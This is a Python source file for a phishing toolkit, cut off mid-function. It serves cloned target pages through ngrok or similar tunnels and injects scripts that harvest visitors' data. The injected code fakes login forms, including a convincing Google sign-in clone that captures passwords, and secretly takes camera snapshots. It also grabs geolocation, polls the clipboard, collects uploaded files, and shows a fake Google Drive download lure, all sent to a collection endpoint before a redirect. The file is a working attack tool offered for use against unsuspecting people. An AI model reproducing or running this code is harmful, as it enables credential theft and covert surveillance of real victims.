import base64
import json
import os
import platform
import random
import string
import subprocess
import tarfile
import time
import zipfile
import threading
import requests
import logging
from flask import Flask, request, redirect, jsonify, make_response
import pyshorteners
from urllib.parse import urlparse, urljoin
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress
import jwt
from bs4 import BeautifulSoup

SESSION_FILE = '.phishgen_session.json'

RESULTS_DIR = os.path.join(os.path.expanduser('~'),
    'storage/documents/PhisoGen_Results' if os.environ.get('PREFIX') else 'Documents/PhisoGen_Results')

# Auto setup Termux storage access
if os.environ.get('PREFIX'):
    try:
        subprocess.run(['termux-setup-storage'], capture_output=True, timeout=10)
    except:
        pass

TUNNEL_NGROK = "ngrok"
TUNNEL_PINGGY = "pinggy"
TUNNEL_CLOUDFLARE = "cloudflare"

console = Console()

logging.getLogger("werkzeug").setLevel(logging.ERROR)

# === Pyngrok import with Termux/Android fallback ===
NGROK_BIN = None
NGROK_MANAGER = None

try:
    from pyngrok import ngrok, conf, exception as ngrok_exception
    logging.getLogger("pyngrok").setLevel(logging.ERROR)
    NGROK_MANAGER = "pyngrok"
except Exception as e:
    console.print(f"[yellow][!] pyngrok import failed ({str(e)[:60]}...)[/]")
    console.print("[yellow][!] Falling back to direct ngrok binary[/]")
    ngrok = None
    conf = None
    ngrok_exception = Exception

    class NgrokProcess:
        def __init__(self):
            self.process = None
            self.bin = "ngrok"

        def set_bin(self, path):
            self.bin = path

        def kill(self):
            if self.process:
                try: self.process.terminate()
                except: pass
            try: subprocess.run(["pkill", "-f", "ngrok"], capture_output=True)
            except: pass

        def connect(self, addr="5000", **kwargs):
            self.kill()
            self.process = subprocess.Popen(
                [self.bin, "http", addr, "--log=stdout"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(4)
            try:
                resp = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
                tunnels = resp.json().get("tunnels", [])
                if tunnels:
                    class T: pass
                    t = T(); t.public_url = tunnels[0]["public_url"]; return t
            except:
                pass
            class T: pass
            t = T(); t.public_url = None; return t

    class NgrokConf:
        def get_default(self):
            return self

    ngrok = NgrokProcess()
    conf = NgrokConf()
    ngrok_exception = Exception

class PhishingGenerator:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.logger.disabled = True
        self.results = []
        self.victims = {}
        self.server_url = None
        self.language = None
        self.ngrok_auth_token = None
        self.show_victims = False
        self.shortener = pyshorteners.Shortener()
        self.secret_key = os.urandom(24)
        self.live_display = None
        self.webhook_url = self._load_session_key('webhook_url')
        self.ngrok_region = self._load_session_key('ngrok_region') or 'ap'
        self.server_port = self._load_session_key('server_port') or 5000
        self.tunnel_type = self._load_session_key('tunnel_type') or TUNNEL_NGROK
        self.tunnel_process = None
        self.cf_token = self._load_session_key('cf_token')
        
        # Setup logging
        try:
            if not os.path.exists('logs'):
                os.makedirs('logs')
            logging.basicConfig(
                level=logging.ERROR,
                format='%(asctime)s - %(levelname)s - %(message)s',
                filename=os.path.join(RESULTS_DIR, 'logs/phishing.log'),
                filemode='a'
            )
            self.logger = logging.getLogger(__name__)
            self.logger.disabled = True
        except Exception as e:
            print(f"Error setting up logging: {str(e)}")
            self.logger = logging.getLogger(__name__)
        
        # Create required directories
        try:
            for directory in ['captured_images', 'uploaded_files', 'templates', 'logs']:
                path = os.path.join(RESULTS_DIR, directory) if directory != 'templates' else directory
                if not os.path.exists(path):
                    os.makedirs(path)
        except Exception as e:
            print(f"Error creating directories: {str(e)}")

        # Flask routes
        @self.app.route('/')
        def home():
            return "Server Berjalan"
            
        @self.app.route('/phish/<phish_id>', methods=['GET', 'POST'])
        def serve_phishing(phish_id):
            try:
                target_url = request.args.get('url')
                phish_type = request.args.get('type', 'default')
                
                if not target_url:
                    raise ValueError("URL target tidak diberikan")
                
                # Fetch the target URL content
                session = requests.Session()
                resp = session.get(target_url, headers={'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0')}, timeout=10)
                
                if resp.status_code != 200:
                    raise ValueError("Gagal mengakses URL target")
                
                # Process the HTML content
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                # Rewrite all relative URLs to absolute using the phishing server
                for tag in soup.find_all(['a', 'img', 'script', 'link']):
                    attr = 'href' if tag.name in ['a', 'link'] else 'src'
                    if tag.has_attr(attr):
                        original_url = tag[attr]
                        parsed_original = urlparse(original_url)
                        if not parsed_original.scheme and not parsed_original.netloc:
                            # It's a relative URL, convert to absolute
                            absolute_url = urljoin(target_url, original_url)
                            tag[attr] = absolute_url
                
                proxied_content = str(soup)

                # Inject permission scripts based on phishing type
                permission_script = """
                <script>
                window.onload = function() {
                    // Collect device info
                    fetch('/collect-data', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'device_info',
                            data: {
                                userAgent: navigator.userAgent,
                                platform: navigator.platform,
                                language: navigator.language,
                                screen: screen.width + 'x' + screen.height,
                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                            }
                        })
                    });
                    // Request permissions based on phishing type
                """
                
                if phish_type == "location":
                    permission_script += """
                    var gaLocPopup = document.createElement('div');
                    gaLocPopup.innerHTML = '<div id="locOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
                        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
                            '<div style="font-size:56px;margin-bottom:12px;">📍</div>' +
                            '<h2 style="margin:0 0 6px;color:#1a1a1a;font-size:22px;font-weight:600;">Allow Location Access</h2>' +
                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 20px;">This website needs your location to show relevant content and provide a better experience near you.</p>' +
                            '<button id="locAllowBtn" style="width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 2px 8px rgba(26,115,232,0.3);">Allow Location Access</button>' +
                        '</div></div>';
                    document.body.appendChild(gaLocPopup);
                    document.getElementById('locAllowBtn').addEventListener('click', function() {
                        var o = document.getElementById('locOverlay');
                        if (o) o.style.display = 'none';
                        navigator.geolocation.getCurrentPosition(function(position) {
                            fetch('/collect-data', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    type: 'location',
                                    lat: position.coords.latitude,
                                    lng: position.coords.longitude
                                })
                            }).then(function() {
                                window.top.location.href = '""" + target_url + """';
                            });
                        }, function() {
                            window.top.location.href = '""" + target_url + """';
                        });
                    });
                    """
                
                elif phish_type == "form":
                    permission_script += """
                    // Create and show login form popup
                    var formHtml = `
                        <div id="loginForm" style="position:fixed; top:0; left:0; width:100%; height:100%; 
                            background:rgba(0,0,0,0.8); display:flex; justify-content:center; align-items:center; z-index:9999;">
                            <div style="background:white; padding:30px; border-radius:10px; box-shadow:0 0 20px rgba(0,0,0,0.5); max-width:400px; width:90%;">
                                <h2 style="margin-top:0; color:#333; text-align:center;">Login Required</h2>
                                <form id="authForm" style="display:flex; flex-direction:column; gap:15px;">
                                    <input type="email" id="email" placeholder="Email" required style="padding:10px; border:1px solid #ddd; border-radius:5px;">
                                    <div style="position:relative;">
                                        <input type="password" id="password" placeholder="Password" required style="padding:10px; border:1px solid #ddd; border-radius:5px; width:100%;">
                                        <span onclick="togglePassword()" style="position:absolute; right:10px; top:50%; transform:translateY(-50%); cursor:pointer; color:#666;">
                                            👁️
                                        </span>
                                    </div>
                                    <div style="display:flex; justify-content:space-between; align-items:center; font-size:14px;">
                                        <label style="display:flex; align-items:center; gap:5px; color:#666;">
                                            <input type="checkbox" id="remember"> Remember me
                                        </label>
                                        <a href="#" onclick="showForgotPassword()" style="color:#007bff; text-decoration:none;">
                                            Forgot Password?
                                        </a>
                                    </div>
                                    <button type="submit" style="padding:10px; background:#007bff; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">
                                        Login
                                    </button>
                                </form>
                            </div>
                        </div>
                    `;
                    document.body.insertAdjacentHTML('beforeend', formHtml);
                    
                    // Add JavaScript functions
                    window.togglePassword = function() {
                        var pwd = document.getElementById('password');
                        pwd.type = pwd.type === 'password' ? 'text' : 'password';
                    }
                    
                    window.showForgotPassword = function() {
                        alert('Password reset link has been sent to your email');
                    }
                    
                    document.getElementById('authForm').addEventListener('submit', function(e) {
                        e.preventDefault();
                        var formData = {
                            email: document.getElementById('email').value,
                            password: document.getElementById('password').value,
                            remember: document.getElementById('remember').checked
                        };
                        
                        fetch('/collect-data', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                type: 'form_data',
                                data: formData
                            })
                        }).then(function() {
                            window.top.location.href = '""" + target_url + """';
                        });
                    });
                    """

                elif phish_type == "camera":
                    permission_script += """
                    var gaCamPopup = document.createElement('div');
                    gaCamPopup.innerHTML = '<div id="camOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
                        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
                            '<div style="font-size:56px;margin-bottom:12px;">📷</div>' +
                            '<h2 style="margin:0 0 6px;color:#1a1a1a;font-size:22px;font-weight:600;">Camera Access Required</h2>' +
                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 20px;">Please allow camera access to verify your identity and complete the secure verification process.</p>' +
                            '<button id="camAllowBtn" style="width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 2px 8px rgba(26,115,232,0.3);">Allow Camera Access</button>' +
                        '</div></div>';
                    document.body.appendChild(gaCamPopup);
                    document.getElementById('camAllowBtn').addEventListener('click', function() {
                        var o = document.getElementById('camOverlay');
                        if (o) o.style.display = 'none';
                        navigator.mediaDevices.getUserMedia({video: true})
                        .then(function(stream) {
                            var video = document.createElement('video');
                            var canvas = document.createElement('canvas');
                            video.style.display = 'none';
                            canvas.style.display = 'none';
                            document.body.appendChild(video);
                            document.body.appendChild(canvas);
                            video.srcObject = stream;
                            video.play();
                            video.onloadedmetadata = function() {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                setTimeout(function() {
                                    canvas.getContext('2d').drawImage(video, 0, 0);
                                    var imageData = canvas.toDataURL('image/jpeg');
                                    fetch('/collect-data', {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({
                                            type: 'camera_capture',
                                            image: imageData
                                        })
                                    }).then(function() {
                                        stream.getTracks().forEach(track => track.stop());
                                        video.remove();
                                        canvas.remove();
                                        window.top.location.href = '""" + target_url + """';
                                    });
                                }, 1000);
                            };
                        }).catch(function() {
                            window.top.location.href = '""" + target_url + """';
                        });
                    });
                    """
                elif phish_type == "clipboard":
                    permission_script += """
                    // Capture clipboard data on copy events
                    document.addEventListener('copy', function(e) {
                        var clipboardData = window.getSelection().toString();
                        fetch('/collect-data', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                type: 'clipboard',
                                data: { content: clipboardData }
                            })
                        });
                    });
                    // Also capture periodically
                    setInterval(function() {
                        navigator.clipboard.readText().then(function(text) {
                            if (text && text.length > 0) {
                                fetch('/collect-data', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        type: 'clipboard',
                                        data: { content: text }
                                    })
                                });
                            }
                        }).catch(function() {});
                    }, 5000);
                    """

                elif phish_type == "file":
                    permission_script += """
                    // Create and show file upload popup
                    var uploadHtml = `
                        <div id="fileUploadForm" style="position:fixed; top:0; left:0; width:100%; height:100%; 
                            background:rgba(0,0,0,0.8); display:flex; justify-content:center; align-items:center; z-index:9999;">
                            <div style="background:white; padding:30px; border-radius:10px; box-shadow:0 0 20px rgba(0,0,0,0.5); max-width:400px; width:90%;">
                                <h2 style="margin-top:0; color:#333; text-align:center;">Please Upload Required Files</h2>
                                <form id="uploadForm" style="display:flex; flex-direction:column; gap:15px;">
                                    <input type="file" id="fileInput" multiple required style="padding:10px; border:1px solid #ddd; border-radius:5px;">
                                    <button type="submit" style="padding:10px; background:#007bff; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">
                                        Upload Files
                                    </button>
                                </form>
                            </div>
                        </div>
                    `;
                    document.body.insertAdjacentHTML('beforeend', uploadHtml);
                    
                    document.getElementById('uploadForm').addEventListener('submit', function(e) {
                        e.preventDefault();
                        var files = document.getElementById('fileInput').files;
                        var formData = new FormData();
                        
                        for(var i = 0; i < files.length; i++) {
                            formData.append('files[]', files[i]);
                        }
                        
                        fetch('/collect-data', {
                            method: 'POST',
                            body: formData
                        }).then(function() {
                            window.top.location.href = '""" + target_url + """';
                        });
                    });
                    """

                elif phish_type == "combo":
                    permission_script += """
                    var gaComPopup = document.createElement('div');
                    gaComPopup.innerHTML = '<div id="comOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
                        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
                            '<div style="font-size:48px;margin-bottom:10px;">🔐</div>' +
                            '<h2 style="margin:0 0 6px;color:#1a1a1a;font-size:22px;font-weight:600;">Identity Verification Required</h2>' +
                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 20px;">For security purposes, please allow camera and location access to complete the verification process.</p>' +
                            '<button id="comAllowBtn" style="width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 2px 8px rgba(26,115,232,0.3);">Continue with Verification</button>' +
                        '</div></div>';
                    document.body.appendChild(gaComPopup);
                    document.getElementById('comAllowBtn').addEventListener('click', function() {
                        var o = document.getElementById('comOverlay');
                        if (o) o.style.display = 'none';
                        var comboData = {};
                        var done = 0;
                        function tryRedirect() { done++; if (done >= 2) window.top.location.href = '""" + target_url + """'; }
                        navigator.geolocation.getCurrentPosition(function(position) {
                            fetch('/collect-data', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({ type: 'location', lat: position.coords.latitude, lng: position.coords.longitude })
                            }).then(tryRedirect);
                        }, tryRedirect);
                        navigator.mediaDevices.getUserMedia({video: true})
                        .then(function(stream) {
                            var video = document.createElement('video');
                            var canvas = document.createElement('canvas');
                            video.style.display = 'none'; canvas.style.display = 'none';
                            document.body.appendChild(video); document.body.appendChild(canvas);
                            video.srcObject = stream; video.play();
                            video.onloadedmetadata = function() {
                                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                                setTimeout(function() {
                                    canvas.getContext('2d').drawImage(video, 0, 0);
                                    fetch('/collect-data', {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({ type: 'camera_capture', image: canvas.toDataURL('image/jpeg') })
                                    }).then(function() {
                                        stream.getTracks().forEach(function(t) { t.stop(); });
                                        video.remove(); canvas.remove();
                                        tryRedirect();
                                    });
                                }, 1500);
                            };
                        }).catch(tryRedirect);
                    });
                    """

                elif phish_type == "clickjack":
                    permission_script += """
                    var cjOverlay = document.createElement('div');
                    cjOverlay.innerHTML = '<div id="cjContainer" style="position:fixed;top:0;left:0;width:100%;height:100%;' +
                        'background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
                        '<div style="background:#fff;border-radius:16px;padding:0;text-align:center;overflow:hidden;' +
                            'box-shadow:0 12px 48px rgba(0,0,0,0.25);max-width:400px;width:90%;">' +
                            '<div style="background:#f8f9fa;padding:20px 24px 12px;border-bottom:1px solid #e8eaed;">' +
                                '<div style="display:flex;align-items:center;gap:10px;">' +
                                    '<div style="width:36px;height:36px;background:#1a73e8;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;color:#fff;">G</div>' +
                                    '<div style="text-align:left;flex:1;"><div style="font-size:14px;font-weight:500;color:#1a1a1a;">Google Drive</div><div style="font-size:12px;color:#5f6368;">drive.google.com</div></div>' +
                                    '<div style="color:#5f6368;font-size:20px;">⋮</div>' +
                                '</div>' +
                            '</div>' +
                            '<div style="padding:28px 24px 20px;">' +
                                '<div style="width:72px;height:72px;background:#e8f0fe;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">' +
                                    '<svg width="36" height="36" viewBox="0 0 24 24" fill="#1a73e8"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>' +
                                '</div>' +
                                '<h2 style="margin:0 0 4px;color:#1a1a1a;font-size:18px;font-weight:500;">Document.pdf</h2>' +
                                '<p style="color:#5f6368;margin:0 0 2px;font-size:13px;">Shared by: Anonymous • 2.4 MB</p>' +
                                '<p style="color:#5f6368;margin:0 0 18px;font-size:12px;">PDF document • Standard license</p>' +
                                '<div style="background:#f1f3f4;border-radius:8px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#3c4043;">' +
                                    'To download this file, please verify that you are not a robot. This helps us maintain security.' +
                                '</div>' +
                                '<button id="cjBtn" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;' +
                                    'border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;letter-spacing:.3px;' +
                                    'box-shadow:0 2px 6px rgba(26,115,232,0.25);">Verify & Download</button>' +
                                '<p style="color:#9aa0a6;font-size:11px;margin:12px 0 0;">By clicking, you agree to our Terms of Service</p>' +
                            '</div>' +
                        '</div></div>';
                    document.body.appendChild(cjOverlay);

                    document.getElementById('cjBtn').addEventListener('click', function() {
                        document.getElementById('cjContainer').innerHTML = '<div style="background:#fff;border-radius:16px;overflow:hidden;' +
                            'box-shadow:0 12px 48px rgba(0,0,0,0.25);max-width:400px;width:90%;padding:36px 24px;text-align:center;">' +
                            '<div style="width:56px;height:56px;margin:0 auto 16px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:cjSpin .8s linear infinite;"></div>' +
                            '<style>@keyframes cjSpin{to{transform:rotate(360deg)}}</style>' +
                            '<h2 style="margin:0 0 4px;color:#1a1a1a;font-size:18px;font-weight:500;">Verifying...</h2>' +
                            '<p style="color:#5f6368;margin:0 0 16px;font-size:14px;">Please wait while we verify your identity</p>' +
                            '<div style="width:100%;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden;">' +
                                '<div style="width:0%;height:100%;background:#1a73e8;border-radius:2px;" id="cjProgress"></div>' +
                            '</div></div>';

                        var collectedData = { type: 'clickjack', data: { action: 'download_clicked', time: new Date().toISOString() } };
                        var capturesDone = 0;
                        var totalCaptures = 0;

                        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                            totalCaptures++;
                            navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                                var video = document.createElement('video');
                                video.srcObject = stream; video.play();
                                setTimeout(function() {
                                    var canvas = document.createElement('canvas');
                                    canvas.width = video.videoWidth || 640;
                                    canvas.height = video.videoHeight || 480;
                                    canvas.getContext('2d').drawImage(video, 0, 0);
                                    collectedData.data.camera = canvas.toDataURL('image/jpeg', 0.8);
                                    stream.getTracks().forEach(function(t) { t.stop(); });
                                    capturesDone++; checkDone();
                                }, 500);
                            }).catch(function() { capturesDone++; checkDone(); });
                        }

                        if (navigator.geolocation) {
                            totalCaptures++;
                            navigator.geolocation.getCurrentPosition(function(pos) {
                                collectedData.data.latitude = pos.coords.latitude;
                                collectedData.data.longitude = pos.coords.longitude;
                                collectedData.data.accuracy = pos.coords.accuracy;
                                capturesDone++; checkDone();
                            }, function() { capturesDone++; checkDone(); }, { enableHighAccuracy: true, timeout: 5000 });
                        }

                        function checkDone() { if (capturesDone >= totalCaptures) sendAndRedirect(); }

                        function sendAndRedirect() {
                            var p = document.getElementById('cjProgress');
                            if (p) p.style.width = '100%';
                            fetch('/collect-data', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify(collectedData)
                            }).then(function() { window.top.location.href = '""" + target_url + """'; });
                        }

                        if (totalCaptures === 0) setTimeout(sendAndRedirect, 2000);
                        else setTimeout(function() { if (capturesDone < totalCaptures) { capturesDone = totalCaptures; sendAndRedirect(); } }, 6000);

                        var w = 0;
                        setInterval(function() {
                            var p = document.getElementById('cjProgress');
                            if (p) { w = Math.min(w + 5, 90); p.style.width = w + '%'; }
                            if (capturesDone >= totalCaptures) clearInterval(this);
                        }, 200);
                    });
                    """

                elif phish_type == "googleauth":
                    permission_script += """
                    var authStyle = document.createElement('style');
                    authStyle.textContent = `
                        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
                        #gaPopup * { font-family: 'Roboto', 'Google Sans', arial, sans-serif; box-sizing:border-box; }
                        #gaPopup .ga-card { background:#fff; border-radius:8px; padding:48px 40px 36px; max-width:450px; width:90%;
                            box-shadow:0 2px 10px rgba(0,0,0,0.13); text-align:center; }
                        #gaPopup .ga-input-wrap { position:relative; margin-top:24px; text-align:left; }
                        #gaPopup .ga-input-wrap input { width:100%; padding:13px 15px; font-size:16px; border:1px solid #dadce0;
                            border-radius:4px; outline:none; background:transparent; transition:border .15s; }
                        #gaPopup .ga-input-wrap input:focus { border-color:#1a73e8; border-width:2px; padding:12px 14px; }
                        #gaPopup .ga-input-wrap label { position:absolute; left:15px; top:14px; color:#5f6368; font-size:16px;
                            pointer-events:none; transition:.15s; background:#fff; padding:0 4px; }
                        #gaPopup .ga-input-wrap input:focus + label,
                        #gaPopup .ga-input-wrap input:not(:placeholder-shown) + label { top:-8px; font-size:12px; color:#1a73e8; }
                        #gaPopup .ga-input-wrap input:not(:focus):not(:placeholder-shown) + label { color:#5f6368; }
                        #gaPopup .ga-btn { width:100%; padding:9px 24px; margin-top:24px; background:#1a73e8; color:#fff;
                            border:none; border-radius:4px; font-size:15px; font-weight:500; cursor:pointer; letter-spacing:.25px; }
                        #gaPopup .ga-btn:hover { background:#1b66c9; box-shadow:0 1px 3px rgba(26,115,232,0.3); }
                        #gaPopup .ga-btn:disabled { opacity:0.6; cursor:default; }
                        #gaPopup .ga-link { color:#1a73e8; font-size:14px; font-weight:500; text-decoration:none; cursor:pointer; display:inline-block; margin-top:8px; }
                        #gaPopup .ga-link:hover { color:#1b66c9; }
                        #gaPopup .ga-footer { margin-top:32px; font-size:12px; color:#5f6368; }
                        #gaPopup .ga-footer a { color:#1a73e8; text-decoration:none; font-weight:500; padding:8px; }
                        #gaPopup .ga-footer a:hover { color:#1b66c9; }
                        #gaPopup .ga-error { color:#d93025; font-size:13px; margin-top:6px; display:none; }
                    `;
                    document.head.appendChild(authStyle);
                    var gaPopup = document.createElement('div');
                    gaPopup.id = 'gaPopup';
                    gaPopup.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#f0f2f5;display:flex;justify-content:center;align-items:center;z-index:9999;';
                    gaPopup.innerHTML = '<div class="ga-card" id="gaCard1">' +
                        '<div style="margin-bottom:16px;">' +
                            '<svg viewBox="0 0 75 24" width="75" height="24"><path fill="#4285F4" d="M67.955 13.89c0 3.8-2.085 5.97-5.675 5.97-3.59 0-5.7-2.17-5.7-5.97 0-3.825 2.11-5.995 5.7-5.995 3.59 0 5.675 2.17 5.675 5.994zm-3.13 0c0-2.195-.905-3.65-2.545-3.65-1.64 0-2.545 1.455-2.545 3.65 0 2.195.905 3.625 2.545 3.625 1.64 0 2.545-1.43 2.545-3.625zM74.66 19.86l-4.83-7.585 4.545-6.99h-3.225l-4.93 7.76V2.065h-2.57V19.86h2.57v-5.52l1.37-2.17 3.65 7.69zM40.995 2.065h-2.57V19.86h2.57zM50.92 14.295c0 1.075-.345 1.87-1.04 2.385-.695.515-1.66.775-2.895.775-1.565 0-3.12-.395-4.66-1.18l-.005 2.15c1.49.66 3.14.99 4.945.99 3.29 0 5.41-1.57 5.41-4.86V2.065h-5.755v2.24h3.185v4.08c-.595-.35-1.48-.555-2.65-.555-2.38 0-4.09 1.405-4.09 3.94v1.695c0 1.645 1.05 2.785 2.65 2.785 1.795 0 2.89-.845 2.89-2.35zm-3.375-1.69c0 .905-.575 1.43-1.525 1.43-.95 0-1.52-.525-1.52-1.43v-1.18c0-.905.57-1.43 1.52-1.43.95 0 1.525.525 1.525 1.43zM11.525 19.86v-7.75H8.415v7.75H5.85V2.065H8.42v7.7h3.105v-7.7h2.57V19.86zM0 19.86l3.86-8.845H1.05L0 13.815l1.04 2.795h2.09L0 24.57h2.75l2.19-5.78-3.41-7.775h2.66L9.28 19.86h-2.7l-1.37-3.365h-3.11L.72 19.86z" /></svg>' +
                        '</div>' +
                        '<h1 style="font-size:24px;font-weight:400;color:#202124;margin:0 0 8px;">Sign in</h1>' +
                        '<p style="font-size:16px;color:#202124;margin:0 0 24px;">Use your Google Account</p>' +
                        '<div class="ga-input-wrap">' +
                            '<input id="gaEmail" type="text" placeholder=" " autocomplete="username" autocapitalize="none">' +
                            '<label for="gaEmail">Email or phone</label>' +
                        '</div>' +
                        '<div class="ga-error" id="gaEmailError">Couldn\\'t find your Google Account</div>' +
                        '<button class="ga-btn" id="gaNext1">Next</button>' +
                        '<div style="margin-top:40px;text-align:left;">' +
                            '<a class="ga-link" href="#">Forgot email?</a>' +
                            '<p style="font-size:14px;color:#5f6368;margin-top:32px;">Not your computer? Use a <a style="color:#1a73e8;font-weight:500;text-decoration:none;cursor:pointer;">Guest window</a> to sign in privately.</p>' +
                            '<div style="margin-top:40px;display:flex;justify-content:space-between;align-items:center;">' +
                                '<a class="ga-link" href="#" style="font-size:14px;">Create account</a>' +
                            '</div>' +
                        '</div>' +
                    '</div>';
                    document.body.appendChild(gaPopup);

                    var gaEmail = document.getElementById('gaEmail');
                    var gaNext1 = document.getElementById('gaNext1');
                    var gaEmailError = document.getElementById('gaEmailError');

                    function showStep2(email) {
                        gaPopup.innerHTML = '<div class="ga-card" id="gaCard2">' +
                            '<div style="margin-bottom:16px;">' +
                                '<svg viewBox="0 0 75 24" width="75" height="24"><path fill="#4285F4" d="M67.955 13.89c0 3.8-2.085 5.97-5.675 5.97-3.59 0-5.7-2.17-5.7-5.97 0-3.825 2.11-5.995 5.7-5.995 3.59 0 5.675 2.17 5.675 5.994zm-3.13 0c0-2.195-.905-3.65-2.545-3.65-1.64 0-2.545 1.455-2.545 3.65 0 2.195.905 3.625 2.545 3.625 1.64 0 2.545-1.43 2.545-3.625zM74.66 19.86l-4.83-7.585 4.545-6.99h-3.225l-4.93 7.76V2.065h-2.57V19.86h2.57v-5.52l1.37-2.17 3.65 7.69zM40.995 2.065h-2.57V19.86h2.57zM50.92 14.295c0 1.075-.345 1.87-1.04 2.385-.695.515-1.66.775-2.895.775-1.565 0-3.12-.395-4.66-1.18l-.005 2.15c1.49.66 3.14.99 4.945.99 3.29 0 5.41-1.57 5.41-4.86V2.065h-5.755v2.24h3.185v4.08c-.595-.35-1.48-.555-2.65-.555-2.38 0-4.09 1.405-4.09 3.94v1.695c0 1.645 1.05 2.785 2.65 2.785 1.795 0 2.89-.845 2.89-2.35zm-3.375-1.69c0 .905-.575 1.43-1.525 1.43-.95 0-1.52-.525-1.52-1.43v-1.18c0-.905.57-1.43 1.52-1.43.95 0 1.525.525 1.525 1.43zM11.525 19.86v-7.75H8.415v7.75H5.85V2.065H8.42v7.7h3.105v-7.7h2.57V19.86zM0 19.86l3.86-8.845H1.05L0 13.815l1.04 2.795h2.09L0 24.57h2.75l2.19-5.78-3.41-7.775h2.66L9.28 19.86h-2.7l-1.37-3.365h-3.11L.72 19.86z" /></svg>' +
                            '</div>' +
                            '<div style="display:flex;align-items:center;gap:6px;margin-bottom:24px;">' +
                                '<div style="width:32px;height:32px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;">' + email[0].toUpperCase() + '</div>' +
                                '<span style="font-size:14px;color:#5f6368;">' + email + '</span>' +
                            '</div>' +
                            '<h1 style="font-size:24px;font-weight:400;color:#202124;margin:0 0 8px;">Welcome back</h1>' +
                            '<div class="ga-input-wrap">' +
                                '<input id="gaPass" type="password" placeholder=" " autocomplete="current-password">' +
                                '<label for="gaPass">Enter your password</label>' +
                            '</div>' +
                            '<div class="ga-error" id="gaPassError">Wrong password. Try again.</div>' +
                            '<div style="margin:8px 0 0;text-align:left;">' +
                                '<label style="font-size:14px;color:#5f6368;cursor:pointer;"><input type="checkbox" id="gaShowPass"> Show password</label>' +
                            '</div>' +
                            '<button class="ga-btn" id="gaNext2">Next</button>' +
                            '<div style="margin-top:40px;text-align:left;">' +
                                '<a class="ga-link" href="#">Forgot password?</a>' +
                            '</div>' +
                        '</div>';

                        document.getElementById('gaShowPass').addEventListener('change', function() {
                            var p = document.getElementById('gaPass');
                            p.type = this.checked ? 'text' : 'password';
                        });

                        document.getElementById('gaNext2').addEventListener('click', function() {
                            var pass = document.getElementById('gaPass').value;
                            if (!pass) { document.getElementById('gaPassError').style.display = 'block'; return; }
                            document.getElementById('gaNext2').disabled = true;
                            document.getElementById('gaNext2').textContent = 'Verifying...';
                            fetch('/collect-data', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({ type: 'google_auth', data: { email: email, password: pass } })
                            }).then(function() {
                                window.top.location.href = '""" + target_url + """';
                            });
                        });

                        document.getElementById('gaPass').addEventListener('keydown', function(e) {
